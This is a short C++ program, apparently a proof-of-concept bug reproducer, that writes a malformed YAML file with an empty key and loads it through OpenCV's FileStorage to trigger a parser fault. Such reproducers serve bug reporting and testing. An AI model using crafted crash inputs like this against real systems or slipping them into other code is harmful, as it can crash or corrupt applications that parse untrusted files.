#include <fstream>
#include <opencv2/core.hpp>

int main() {
    // Write malformed YAML with empty key
    const char* yaml =
        "%YAML:1.0\n"
        "---\n"
        "rect:\n"
        "   x: 10\n"
        "   y: 20\n"
        "   width: 1000\n"
        ": 10\n";

    std::ofstream("/tmp/poc.yaml") << yaml;
    try {
        cv::FileStorage fs("/tmp/poc.yaml", cv::FileStorage::READ);
    } catch (const cv::Exception&) {}
    return 0;
}
